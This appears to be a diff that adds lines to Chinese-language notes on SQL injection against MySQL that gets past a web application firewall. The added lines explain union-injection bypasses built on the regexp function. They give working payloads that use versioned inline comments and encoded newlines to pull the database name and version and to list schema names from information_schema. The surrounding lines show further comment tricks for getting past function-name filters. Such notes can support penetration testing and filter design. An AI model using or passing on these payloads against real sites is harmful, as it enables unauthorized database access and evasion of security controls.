@@ -54,3 +54,19 @@ user/*!*/() #内敛注释
 函数名绕过
 /*!extractvalue/*!/*/**/*/
 /*!updatexml/*!/*/**/*/
+
+联合注入绕过方式
+这里使用mysql自带的正则函数(regexp)
+
+select * from company_info where name like '桑尼';  //查询name等于桑尼的数据
+select * from company_info where name regexp '桑尼'; //查询结果中name包含桑尼的数据
+
+获取详细信息
+尝试获取数据库名、版本，因database()被识别被拦截
+
+-1' regexp "%0A%23" /*!11444union*/ %0A /*!11444select*/ 1,database(/*!11444*/),version(/*!11444*/) %23
+
+注入出表名
+-1' union /*!--+/*%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/
+
+/*!--+/*%0ainformation_schema./*!schemata*/ --+
